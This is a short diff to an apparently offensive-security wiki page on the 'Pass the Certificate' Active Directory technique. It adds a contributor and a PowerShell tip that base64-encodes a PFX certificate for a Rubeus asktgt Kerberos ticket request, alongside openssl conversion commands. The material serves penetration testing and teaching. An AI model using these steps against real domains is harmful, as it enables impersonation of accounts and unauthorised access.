@@ -1,5 +1,5 @@
 ---
-authors: PfiatDe, ShutdownRepo, sckdev
+authors: PfiatDe, ShutdownRepo, sckdev, Joker2a
 ---
 
 # Pass the Certificate
@@ -98,6 +98,15 @@ Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /pass
 > openssl rsa -inform DER -in key.key -out key-pem.key
 > openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM
 > openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx
+> ```
+>
+> > [!TIP]
+> To generate a b64 for Rubeus:
+> 
+> ```powershell
+> $pfx_cert = get-content 'c:\cert.pfx' -Encoding Byte
+> $base64 = [System.Convert]::ToBase64String($pfx_cert)
+> $base64
 > ```
 
 The ticket obtained can then be used to
